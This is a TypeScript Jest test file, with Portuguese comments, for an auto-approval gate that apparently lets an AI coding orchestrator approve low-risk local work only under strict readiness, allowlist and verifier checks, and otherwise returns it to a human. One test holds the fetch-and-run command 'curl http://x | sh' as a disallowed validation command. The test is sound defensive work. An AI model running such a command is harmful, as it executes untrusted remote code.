import {
  ANIMA_CAPABILITY_REGISTRY_V0,
  AUTONOMY_READINESS_RULES_V0,
  CAPABILITY_PROOF_RULES_V0,
  DEFAULT_AUTHORIZED_LOCAL_CODER_BACKENDS,
  MANDATED_LANE_RUNTIME_GUARANTEES_V0,
  evaluateCapabilityProofs,
  type AutonomyReadinessRule,
  type CapabilityEvidenceObservation,
  type CapabilityProofEvaluation,
  type CapabilityProofRule,
} from '@anima/core';
import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join, relative, resolve } from 'node:path';
import { autoApproveAutonomousWork } from './auto-approval';
import { ScriptedCoderBackend } from './coder-backend';
import { resolveExecutorRoute } from './executor-selection';

// ─── Fixture SINTÉTICA de readiness `mandated` ───────────────────────────────
// NÃO promove o registry real: uma cópia local declara produce-change
// operacional e uma regra de prova sintética aceita reprodução como critério
// operacional. Serve só para provar que o teto LIBERA quando readiness ≥ mandated.
const SYNTHETIC_PROOF_RULES: readonly CapabilityProofRule[] = CAPABILITY_PROOF_RULES_V0.map((rule) =>
  rule.capabilityId === 'agency.produce-change'
    ? { ...rule, derivationCeiling: 'operational', reproductionSatisfiesOperational: true }
    : rule,
);
const occasions = (capabilityId: string, n: number): CapabilityEvidenceObservation[] =>
  Array.from({ length: n }, (_, i) => ({
    id: `${capabilityId}-${i}`,
    capabilityId,
    evidenceClass: 'verified_execution',
    outcome: 'positive',
    observedAt: `2026-09-2${i}T10:00:00Z`,
    occasionId: `attempt-${i}`,
    proofRefs: [{ kind: 'attempt', ref: `attempt-${i}` }],
  }));
const syntheticOperationalEvaluations = (): readonly CapabilityProofEvaluation[] =>
  evaluateCapabilityProofs({
    capabilities: ANIMA_CAPABILITY_REGISTRY_V0.map((capability) =>
      capability.id === 'agency.produce-change' ? { ...capability, maturity: 'operational' as const } : capability,
    ),
    rules: SYNTHETIC_PROOF_RULES,
    evidence: occasions('agency.produce-change', 3),
  });
/**
 * Regra de readiness HIPOTÉTICA sem `fail_closed` no mandato — a única garantia que o
 * runtime real ainda não oferece (V0.1: autoria do parecer não provada). Existe só
 * para exercitar o caminho da RPC; com as regras canônicas nada é auto-aprovado.
 */
const HYPOTHETICAL_RULES: readonly AutonomyReadinessRule[] = AUTONOMY_READINESS_RULES_V0.map((rule) =>
  rule.capabilityId === 'agency.produce-change'
    ? { ...rule, requiredSafeguards: { ...rule.requiredSafeguards, mandated: (rule.requiredSafeguards.mandated ?? []).filter((s) => s !== 'fail_closed') } }
    : rule,
);
/** Opções que tornam produce-change `mandated` (sintético + regra hipotética). */
const MANDATED = {
  loadProofEvaluations: async () => syntheticOperationalEvaluations(),
  proofRules: SYNTHETIC_PROOF_RULES,
  readinessRules: HYPOTHETICAL_RULES,
};
/** Sintético operacional com as regras de readiness CANÔNICAS. */
const SYNTHETIC_CANONICAL_RULES = {
  loadProofEvaluations: async () => syntheticOperationalEvaluations(),
  proofRules: SYNTHETIC_PROOF_RULES,
};
/** Estado REAL atual: registry e regras canônicos (produce-change proven → supervised). */
const CURRENT = {
  loadProofEvaluations: async () => evaluateCapabilityProofs({ evidence: occasions('agency.produce-change', 8) }),
};


const validItem = {
  state: 'proposed', impact_level: 'low', capability: 'programming', proposal_version: 1,
  intent: {
    canonical_provenance: { kind: 'canonical_backlog', sourceId: 'FIX-01', document: 'docs/x.md', heading: 'FIX-01', canonicalObjective: 'x', planningGeneration: 1, materializationReason: 'selected_ready' },
    execution_spec: { schema_version: 1, target: { kind: 'project', reference: 'anima' }, executor: 'worktree', coder_backend: 'ollama', model: 'qwen3-coder:latest', base_sha: 'abc', permissions: ['workspace_read', 'workspace_write_isolated'], validation_criteria: [{ label: 'gate', command: 'npm test' }], limits: { max_attempts: 1, max_duration_minutes: 10 }, verifier_requirement: 'required_fail_closed' },
  },
  proposal: { schema_version: 1, data: { included_scope: ['docs/safe.md'] } },
};

const client = (item: typeof validItem = validItem, rpcResult: unknown = { action: 'approved', event_seq: 7 }) => {
  const rpc = jest.fn(async (name: string) => name === 'current_work_intelligence_classification'
    ? { data: { classification: null }, error: null }
    : name === 'record_work_intelligence_classification'
      ? { data: { revision: 1 }, error: null }
      : { data: rpcResult, error: null });
  const single = jest.fn(async () => ({ data: item, error: null }));
  const eq = jest.fn(() => ({ single }));
  const select = jest.fn(() => ({ eq }));
  return { value: { from: jest.fn(() => ({ select })), rpc }, rpc };
};

describe('autoApproveAutonomousWork', () => {
  test('slice canônico local válido persiste aprovação system via RPC com envelope auditável', async () => {
    const c = client();
    const result = await autoApproveAutonomousWork({ client: c.value as never, workItemId: 'wi-1', readGovernorVerdict: () => 'permit', ...MANDATED });
    expect(result).toEqual({ action: 'approved', eventSeq: 7, sourceId: 'FIX-01' });
    expect(c.rpc).toHaveBeenCalledWith('record_work_intelligence_classification', expect.objectContaining({
      p_work_item_id: 'wi-1',
      p_classification: expect.objectContaining({
        risk: 'low',
        provenance: expect.objectContaining({ classifierId: 'autonomous-authorization-v1' }),
      }),
    }));
    expect(c.rpc).toHaveBeenCalledWith('auto_approve_autonomous_work', expect.objectContaining({
      work_item_id: 'wi-1', expected_proposal_version: 1,
      envelope: expect.objectContaining({
        authority: 'autonomous_policy', envelope_version: 1, source_id: 'FIX-01', execution_class: 'canonical_local_isolated_worktree',
        autonomy_readiness: expect.objectContaining({
          schema_version: 1, capability_id: 'agency.produce-change', readiness_rule_version: 'autonomy-readiness-v0',
          observed_level: 'mandated', required_level: 'mandated',
        }),
      }),
    }));
  });

  test.each([
    ['backend externo', { intent: { ...validItem.intent, execution_spec: { ...validItem.intent.execution_spec, coder_backend: 'openai' } } }, 'coder_backend_not_local_authorized'],
    ['executor não-worktree', { intent: { ...validItem.intent, execution_spec: { ...validItem.intent.execution_spec, executor: 'commanded' } } }, 'executor_not_worktree'],
    ['efeito externo', { impact_level: 'external' }, 'impact_not_low'],
    ['sem validação', { intent: { ...validItem.intent, execution_spec: { ...validItem.intent.execution_spec, validation_criteria: [] } } }, 'validation_criteria_missing'],
    ['mutação de segurança', { proposal: { schema_version: 1, data: { included_scope: ['supabase/migrations/x.sql'] } } }, 'security_sensitive_scope'],
  ])('%s → humano e não chama RPC', async (_name, patch, reason) => {
    const c = client({ ...validItem, ...patch } as typeof validItem);
    const load = jest.fn(MANDATED.loadProofEvaluations);
    await expect(autoApproveAutonomousWork({ client: c.value as never, workItemId: 'wi-1', readGovernorVerdict: () => 'permit', ...MANDATED, loadProofEvaluations: load }))
      .resolves.toEqual({ action: 'human_required', reason });
    expect(c.rpc).not.toHaveBeenCalled();
    // Readiness é teto ADICIONAL: o envelope V1 continua negando primeiro.
    expect(load).not.toHaveBeenCalled();
  });

  test('erro da policy/Governor → humano', async () => {
    const c = client();
    const result = await autoApproveAutonomousWork({ client: c.value as never, workItemId: 'wi-1', readGovernorVerdict: () => { throw new Error('sensor'); } });
    expect(result).toEqual({ action: 'human_required', reason: 'policy_error:sensor' });
    expect(c.rpc).not.toHaveBeenCalled();
  });

  test('já aprovado → no-op', async () => {
    const c = client({ ...validItem, state: 'approved' });
    await expect(autoApproveAutonomousWork({ client: c.value as never, workItemId: 'wi-1', readGovernorVerdict: () => 'permit' }))
      .resolves.toEqual({ action: 'already_approved' });
    expect(c.rpc).not.toHaveBeenCalled();
  });

  test('replay da RPC é idempotente', async () => {
    const c = client(validItem, { action: 'replayed', event_seq: 7 });
    await expect(autoApproveAutonomousWork({ client: c.value as never, workItemId: 'wi-1', readGovernorVerdict: () => 'permit', ...MANDATED }))
      .resolves.toEqual({ action: 'replayed', eventSeq: 7, sourceId: 'FIX-01' });
  });

  test('aprova ANTES de classificar — classificação exige versão aprovada (INTEL-01)', async () => {
    // Double que ESPELHA a invariante INTEL-01: `record_work_intelligence_classification`
    // falha enquanto a versão da proposta não tiver um `work_approved`. Com a ordem correta
    // (aprovar → classificar) o fluxo termina em `approved`; a ordem invertida (bug) falharia
    // fechado em `classification_persist_failed:proposal version is not approved`.
    const calls: string[] = [];
    let approved = false;
    const rpc = jest.fn(async (name: string) => {
      calls.push(name);
      if (name === 'current_work_intelligence_classification') return { data: { classification: null }, error: null };
      if (name === 'auto_approve_autonomous_work') { approved = true; return { data: { action: 'approved', event_seq: 7 }, error: null }; }
      if (name === 'record_work_intelligence_classification') {
        return approved
          ? { data: { action: 'recorded' }, error: null }
          : { data: null, error: { message: 'proposal version is not approved' } };
      }
      return { data: null, error: null };
    });
    const single = jest.fn(async () => ({ data: validItem, error: null }));
    const value = { from: jest.fn(() => ({ select: () => ({ eq: () => ({ single }) }) })), rpc };
    const result = await autoApproveAutonomousWork({ client: value as never, workItemId: 'wi-1', readGovernorVerdict: () => 'permit', ...MANDATED });
    expect(result).toEqual({ action: 'approved', eventSeq: 7, sourceId: 'FIX-01' });
    expect(calls).toContain('auto_approve_autonomous_work');
    expect(calls).toContain('record_work_intelligence_classification');
    expect(calls.indexOf('auto_approve_autonomous_work')).toBeLessThan(calls.indexOf('record_work_intelligence_classification'));
  });

  test('classificação existente não é duplicada', async () => {
    const c = client();
    c.rpc.mockImplementation(async (name: string) => name === 'current_work_intelligence_classification'
      ? { data: { classification: { schemaVersion: 1 } }, error: null }
      : { data: { action: 'approved', event_seq: 7 }, error: null });
    const result = await autoApproveAutonomousWork({ client: c.value as never, workItemId: 'wi-1', readGovernorVerdict: () => 'permit', ...MANDATED });
    expect(result).toEqual({ action: 'approved', eventSeq: 7, sourceId: 'FIX-01' });
    expect(c.rpc).not.toHaveBeenCalledWith('record_work_intelligence_classification', expect.anything());
  });
});

describe('autoApproveAutonomousWork — Autonomy Readiness Enforcement V0 (opção B)', () => {
  const run = (options: Record<string, unknown>, item: typeof validItem = validItem) => {
    const c = client(item);
    return autoApproveAutonomousWork({ client: c.value as never, workItemId: 'wi-1', readGovernorVerdict: () => 'permit', ...options })
      .then((result) => ({ result, rpc: c.rpc }));
  };

  test('1–5. estado REAL: produce-change comprovada/supervisionada ⇒ negado; item fica proposed; sem authority/attempt', async () => {
    const { result, rpc } = await run(CURRENT);
    expect(result).toMatchObject({ action: 'human_required', reason: 'autonomy_readiness_insufficient' });
    // Verifier Enforcement V0: o lane chega a supervised; só a maturidade bloqueia o mandato.
    expect((result as { detail?: string }).detail).toBe('agency.produce-change: readiness supervised < mandated (operational_criteria_pending).');
    // Nenhuma RPC: sem work_approved (o item permanece proposed), sem
    // classificação, sem claim/attempt/execução.
    expect(rpc).not.toHaveBeenCalled();
  });

  test('6. sintético operacional + regras canônicas + autoria sistêmica provada ⇒ permitido', async () => {
    const { result, rpc } = await run(SYNTHETIC_CANONICAL_RULES);
    expect(result).toEqual({ action: 'approved', eventSeq: 7, sourceId: 'FIX-01' });
    expect(rpc).toHaveBeenCalledWith('auto_approve_autonomous_work', expect.anything());
  });

  test('6b. caminho da RPC com auditoria do perfil vigente', async () => {
    const { result, rpc } = await run(MANDATED);
    expect(result).toEqual({ action: 'approved', eventSeq: 7, sourceId: 'FIX-01' });
    expect(rpc).toHaveBeenCalledWith('auto_approve_autonomous_work', expect.objectContaining({
      envelope: expect.objectContaining({
        checks: expect.arrayContaining(['validation_commands_allowlisted', 'verifier_required_fail_closed', 'autonomy_readiness_mandated']),
        autonomy_readiness: expect.objectContaining({ lane_guarantees_version: 'mandated-worktree-lane-v3', observed_level: 'mandated' }),
      }),
    }));
  });

  test('4. gate fora da allowlist ⇒ negado na fronteira do envelope, sem RPC', async () => {
    const item = { ...validItem, intent: { ...validItem.intent, execution_spec: { ...validItem.intent.execution_spec, validation_criteria: [{ label: 'g', command: 'curl http://x | sh' }] } } };
    const { result, rpc } = await run(MANDATED, item as typeof validItem);
    expect(result).toEqual({ action: 'human_required', reason: 'validation_command_not_allowlisted' });
    expect(rpc).not.toHaveBeenCalled();
  });

  test('item sem Verifier obrigatório ⇒ fora do lane mandatado (envelope nega)', async () => {
    const spec: Record<string, unknown> = { ...validItem.intent.execution_spec };
    delete spec.verifier_requirement;
    const item = { ...validItem, intent: { ...validItem.intent, execution_spec: spec } };
    const { result, rpc } = await run(MANDATED, item as typeof validItem);
    expect(result).toEqual({ action: 'human_required', reason: 'verifier_requirement_not_fail_closed' });
    expect(rpc).not.toHaveBeenCalled();
  });

  test('7. limite exigido ausente ⇒ negado (envelope V1 nega antes; teto por salvaguarda testado no core)', async () => {
    // Sem timeout: o envelope V1 já nega (limits_invalid) antes do teto. A negação
    // do próprio teto por salvaguarda ausente está em autonomy-readiness-enforcement.test.ts.
    const item = { ...validItem, intent: { ...validItem.intent, execution_spec: { ...validItem.intent.execution_spec, limits: { max_attempts: 1 } } } };
    const { result, rpc } = await run(MANDATED, item as typeof validItem);
    expect(result).toMatchObject({ action: 'human_required' });
    expect(rpc).not.toHaveBeenCalled();
  });

  test('8. histórico/avaliação indisponível ⇒ negado', async () => {
    const unavailable = await run({ loadProofEvaluations: async () => null });
    expect(unavailable.result).toMatchObject({ action: 'human_required', reason: 'autonomy_readiness_history_unavailable' });
    expect(unavailable.rpc).not.toHaveBeenCalled();

    const threw = await run({ loadProofEvaluations: async () => { throw new Error('db down'); } });
    expect(threw.result).toEqual({ action: 'human_required', reason: 'autonomy_readiness_history_unavailable', detail: 'db down' });
    expect(threw.rpc).not.toHaveBeenCalled();

    const empty = await run({ loadProofEvaluations: async () => [] });
    expect(empty.result).toMatchObject({ action: 'human_required', reason: 'autonomy_readiness_evaluation_invalid' });
    expect(empty.rpc).not.toHaveBeenCalled();
  });

  test('9. avaliação inconsistente (operacional contra a regra canônica) ⇒ negado, sem cair no comportamento antigo', async () => {
    const { result, rpc } = await run({ loadProofEvaluations: MANDATED.loadProofEvaluations });
    expect(result).toMatchObject({ action: 'human_required', reason: 'autonomy_readiness_evaluation_invalid' });
    expect((result as { detail?: string }).detail).toMatch(/proof_evaluation_inconsistent/);
    expect(rpc).not.toHaveBeenCalled();
  });

  test('10. readiness manual (sem evidência) ⇒ negado', async () => {
    const { result, rpc } = await run({ loadProofEvaluations: async () => evaluateCapabilityProofs({ evidence: [] }) });
    expect(result).toMatchObject({ action: 'human_required' });
    expect(rpc).not.toHaveBeenCalled();
  });

  test('11/13. INVARIANTE: nenhuma auto-aprovação do sistema concede nível acima da readiness', async () => {
    const rank = ['manual', 'supervised', 'mandated', 'autonomous'];
    const scenarios = [CURRENT, MANDATED, SYNTHETIC_CANONICAL_RULES, { loadProofEvaluations: async () => null }, { loadProofEvaluations: async () => [] }];
    let approvals = 0;
    for (const options of scenarios) {
      const { rpc } = await run(options);
      for (const [name, args] of rpc.mock.calls as unknown as [string, { envelope?: { autonomy_readiness?: { observed_level: string; required_level: string } } }][]) {
        if (name !== 'auto_approve_autonomous_work') continue;
        approvals += 1;
        const audit = args.envelope?.autonomy_readiness;
        expect(audit).toBeDefined();
        expect(audit!.required_level).toBe('mandated');
        expect(rank.indexOf(audit!.observed_level)).toBeGreaterThanOrEqual(rank.indexOf(audit!.required_level));
      }
    }
    // Só os cenários SINTÉTICOS operacionais aprovam; o estado real (proven) nunca.
    expect(approvals).toBe(2);
  });
});

describe('Autonomy Readiness Enforcement V0 — ponto ÚNICO de enforcement', () => {
  const webRoot = resolve(__dirname, '..', '..');
  const sources = (dir: string): string[] =>
    readdirSync(dir).flatMap((name) => {
      const path = join(dir, name);
      if (name === 'node_modules' || name === '.next' || name === '_session') return [];
      if (statSync(path).isDirectory()) return sources(path);
      return /\.(ts|tsx)$/.test(name) && !/\.test\.tsx?$/.test(name) ? [path] : [];
    });

  test('12–15. só o seam de auto-aprovação consulta a readiness: aprovação humana, aceite/integração, compute pago e materialização inalterados', () => {
    const users = ['lib', 'app', 'cli', 'scripts']
      .flatMap((dir) => sources(join(webRoot, dir)))
      .filter((path) => /enforceAutonomyReadinessForAutoApproval|autonomy_readiness_insufficient/.test(readFileSync(path, 'utf8')))
      .map((path) => relative(webRoot, path).replace(/\\/g, '/'));
    expect(users).toEqual(['lib/work-orchestration/auto-approval.ts']);
  });
});

describe('Mandated Envelope Hardening V0 — perfil de garantias amarrado ao runtime', () => {
  const REPO_ROOT = resolve(__dirname, '../../../..');

  test('checkpoint: o executor de worktree selecionado para o lane emite checkpoint', () => {
    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.checkpointEmitted).toBe(true);
    const selection = resolveExecutorRoute(
      { executor: 'worktree', coderBackend: 'ollama', model: 'qwen3-coder:latest', baseSha: 'a'.repeat(40), targetKind: 'project', targetReference: 'anima', resumeCheckpointCommitSha: null },
      { repoRoot: REPO_ROOT, backendOverride: new ScriptedCoderBackend([]) },
    );
    expect(selection.ok).toBe(true);
    if (!selection.ok) return;
    expect(selection.route.adapter.id).toBe('worktree-v1');
    const options = Reflect.get(selection.route.adapter, 'options') as { emitCheckpoint?: boolean };
    expect(options.emitCheckpoint).toBe(true);
  });

  test('backends locais do perfil = default do envelope V1 (sem provider pago)', () => {
    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.localCoderBackends).toEqual(DEFAULT_AUTHORIZED_LOCAL_CODER_BACKENDS);
    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.localCoderBackends).not.toContain('openai');
  });

  test('Verifier e rede declarados com a semântica real (Verifier obrigatório; permissão ≠ isolamento)', () => {
    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.verifier).toBe('required_fail_closed');
    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.verifierAuthorship).toBe('system_proven');
    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.network).toBe('permission_denied');
    expect(MANDATED_LANE_RUNTIME_GUARANTEES_V0.budget).toBe('attempts_and_runtime');
  });
});
